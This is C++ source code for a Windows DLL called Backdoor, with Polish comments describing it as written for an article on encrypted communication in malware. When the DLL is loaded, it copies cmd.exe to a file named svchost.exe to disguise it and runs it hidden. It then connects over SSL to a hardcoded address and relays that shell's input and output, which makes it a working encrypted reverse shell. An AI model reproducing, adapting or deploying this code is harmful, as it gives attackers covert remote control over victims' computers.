#include "BACKDOOR.h"
/*
*  echo 0x10
*  Biblioteka powsta³a na potrzeby artyku³u o OpenSll 
*  i wykorzystaniu szyfrowanej komunikacji w z³o¶liwym oprogramowaniu 
*  Oszczêdzi³em sobie dobrodziejstw standardu C++ i jest bardziej w zgodzie z Ce
*  Implementuje sigleton , jej mankamentem jest to ¿e do tego aby dzia³a³a 
*  wymaga biblioteki dll z openssl 
*/

Backdoor* 
Backdoor::getInstance()
{
         if(__instance == 0) 
            __instance = new Backdoor();
            return __instance;              
}
                          
void
Backdoor::initSystemPath()
{
          char sys_dir[MAX_PATH + 2] = {0};
          unsigned int sLen = GetSystemDirectory(sys_dir,MAX_PATH); 
          if(sLen + strlen("!!SODES=1") <= MAX_PATH)
          {   
             char new_sys_dir[MAX_PATH + 2] = {0};
             DWORD tLen = GetTempPath(MAX_PATH,new_sys_dir);
             if(tLen + strlen("xyd34534567") <= MAX_PATH) strcat(new_sys_dir,"svchost.exe");
             else 
             {
                  memset(new_sys_dir,0x00,MAX_PATH + 2);
                  memcpy(new_sys_dir,sys_dir,MAX_PATH);
                  strcat(new_sys_dir,"\\..\\svchost.exe");          
             } 
             strcat(sys_dir,"\\cmd.exe");
             if(CopyFile(sys_dir,new_sys_dir,false)) 
                memcpy(system_path,new_sys_dir,MAX_PATH);
          }
          else memcpy(system_path,"cmd.exe",MAX_PATH);                     
}                          

Backdoor::Backdoor() : __socket(0)
{
          initSystemPath();            
          SSL_library_init(); 
          system_in = system_out = 0;
          bdoor_in = bdoor_out = 0;
}


Backdoor::~Backdoor()
{          
           if(bdoor_in) CloseHandle(bdoor_in);
           if(bdoor_out) CloseHandle(bdoor_out);
           if(system_in) CloseHandle(system_in);
           if(system_out) CloseHandle(system_out);
           if(INVALID_SOCKET != __socket)  closesocket(__socket);  
}

inline void 
Backdoor::sslRelease(SSL_PROTO& ptr)
{                                 
          if(ptr.pack != 0) 
          {
             SSL_free(ptr.pack);  
             ptr.pack = 0;       //double free bug nicht lol 
          }   
          if(ptr.config != 0) 
          {
             SSL_CTX_free(ptr.config);
             ptr.config = 0;
          }   
          ptr.version = 0;                              
}                                

SSL_PROTO                                                     /*inicjalizuje gniazdo i dodaje je do SSL*/
Backdoor::cryptoSockInit(const char* IP,unsigned int port)
{      
                         //MessageBox(0,"PWNED","PWNED PWNED BUCKED !!!!",0);
                         WSADATA wsa;                        
                         WSAStartup(MAKEWORD(2,0),&wsa);        /* W sumie proces docelowy pewnie ma ju¿ zainicjalizowane */
                         SSL_PROTO ssl_information = {0};       /* gniazda ale gdyby nie mia³ ...... */
                         
                         sockaddr_in client;                   /*  */
                         hostent* host = gethostbyname(IP); 
                         if(host == 0)                         //bad target
                         {
                            ssl_information.__error = __SOCKET_ERROR__;      
                            return ssl_information; 
                         }   
                         client.sin_addr = *((in_addr *)host->h_addr); 
                         client.sin_port = htons(port);
                         client.sin_family = AF_INET;
                         __socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                         if((__socket == INVALID_SOCKET) || 
                            (connect(__socket,(sockaddr*)&client,
                                               sizeof(client)) == SOCKET_ERROR))
                            {
                                                                  ssl_information.__error = __SOCKET_ERROR__;
                                                                  return ssl_information;
                            }                                     
                                     
                         ssl_information.version = SSLv3_client_method();  /* SSL v 3 client side */
                         
                         ssl_information.config = SSL_CTX_new(ssl_information.version);  /* .. */
                         if(ssl_information.config != 0)
                         {
                            ssl_information.pack =  SSL_new(ssl_information.config);         /* */
                            if(ssl_information.pack != 0)
                            { 
                               int __fd_set = SSL_set_fd(ssl_information.pack,__socket);     /* */
                               if(__fd_set != 0) 
                               {
                                  int __theFuckingConnection = SSL_connect(ssl_information.pack); /* handshake */
                                  if(__theFuckingConnection > 0) return ssl_information;   
                               }     
                            }   
                         }                      
                         closesocket(__socket);
                         __socket = INVALID_SOCKET;
                         ssl_information.__error = __SSL_ERROR__; 
                         return ssl_information; 
}                                                          

int                                                        /* socket in + system in & socket out + system out */
Backdoor::proxyIoManager(SSL* ioMaster)
{
                         int rLen , wLen;     
                         DWORD __rw_bytes = 0; 
                         char __recv_buf[__RECV_SIZE__ + 2] = {0};
                         while(true)                      
                         {
                               if(!ReadFile(system_out,__recv_buf,
                                            __RECV_SIZE__,&__rw_bytes,0)) return __CMD_ERROR__;        
                               wLen = SSL_write(ioMaster,__recv_buf,__RECV_SIZE__);  //
                               if(wLen <= 0) return __SSL_ERROR__;    
                               rLen = SSL_read(ioMaster,__recv_buf,__RECV_SIZE__);  
                               if(rLen <= 0) return __SSL_ERROR__;         
                               else if(!WriteFile(system_in,__recv_buf,
                                                  __RECV_SIZE__,&__rw_bytes,0)) 
                                       return __CMD_ERROR__;                                                                              
                         }                              
}                              

PROCESS_INFORMATION                              /* 0 = failed PI = success */
Backdoor::ioInitial()                            /* . */
{                                         
          STARTUPINFO start_attrib = {0};             /*Atrybuty z jakimi zostanie uruchomiony process */
          SECURITY_ATTRIBUTES sec_attrib = {0};       /*Atrrybuty sec lol dla potoków */    
          PROCESS_INFORMATION new_process_info = {0}; /*tu bêdziemy mieli uchwyty do utowrzonego processu jego w¹tków i innych dupreli */
          
          sec_attrib.lpSecurityDescriptor = 0;        /*  */
          sec_attrib.nLength = sizeof(sec_attrib);
          sec_attrib.bInheritHandle = true;   
          
          if((!CreatePipe(&bdoor_in,&system_in,&sec_attrib,0) ||    /* tworzymy pare potoków */
             (!CreatePipe(&system_out,&bdoor_out,&sec_attrib,0)))) 
              return new_process_info; 
                                                                    /* ustawiamy atrybuty dla nowego prcessu */     
          start_attrib.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
          start_attrib.cb = sizeof(start_attrib);
          start_attrib.wShowWindow = SW_HIDE;                        /* */
          start_attrib.hStdInput = bdoor_in;                         /* wejscie processu jest wejsciem gniazda */             
          start_attrib.hStdOutput = start_attrib.hStdError = bdoor_out; /* wyjscie i error processu jest wyjsciem gniazda */  
         
          CreateProcess(0,const_cast<char*>(system_path),
                        0,0,true,0,0,0,&start_attrib,
                        &new_process_info);
          return new_process_info;                  
} 
                    
      

extern "C"
BOOL APIENTRY DllMain(HINSTANCE hInst     /* Library instance handle. */ ,
                       DWORD reason        /* Reason this function is being called. */ ,
                       LPVOID reserved     /* Not used. */ )
{                   
    Backdoor* __bd = Backdoor::getInstance(); 
    static SSL_PROTO __ssl_ptrs = {0};
    static PROCESS_INFORMATION __proc_hnd = {0};
    DisableThreadLibraryCalls(hInst);
    switch(reason)
    {
      case DLL_PROCESS_ATTACH:
          __proc_hnd = __bd->ioInitial();
          if(__proc_hnd.hProcess != 0)
          {                    
             __ssl_ptrs = __bd->cryptoSockInit(_IP,_PORT);
             if(__ssl_ptrs.__error == 0)
             {
                 unsigned int __ioErr = __bd->proxyIoManager(__ssl_ptrs.pack);
                 if(__SSL_ERROR__ != __ioErr) SSL_shutdown(__ssl_ptrs.pack); 
                 __ssl_ptrs.__error = 23;
              }    
          }    
          __bd->sslRelease(__ssl_ptrs); 
      break;
      case DLL_PROCESS_DETACH:
          if(__proc_hnd.hProcess != 0)   
          {   
             DWORD _exitCode = 999;                                                
             GetExitCodeProcess(__proc_hnd.hProcess,&_exitCode);
             if(STILL_ACTIVE == _exitCode) TerminateProcess(__proc_hnd.hProcess,666);  
             if(__proc_hnd.hThread) CloseHandle(__proc_hnd.hThread);                     
             CloseHandle(__proc_hnd.hProcess);
          }  
          if(__ssl_ptrs.__error == 0) SSL_shutdown(__ssl_ptrs.pack);   
          __bd->sslRelease(__ssl_ptrs);  
          delete __bd;
      break;
    }
    /* Returns TRUE on success, FALSE on failure */
    return TRUE;
}
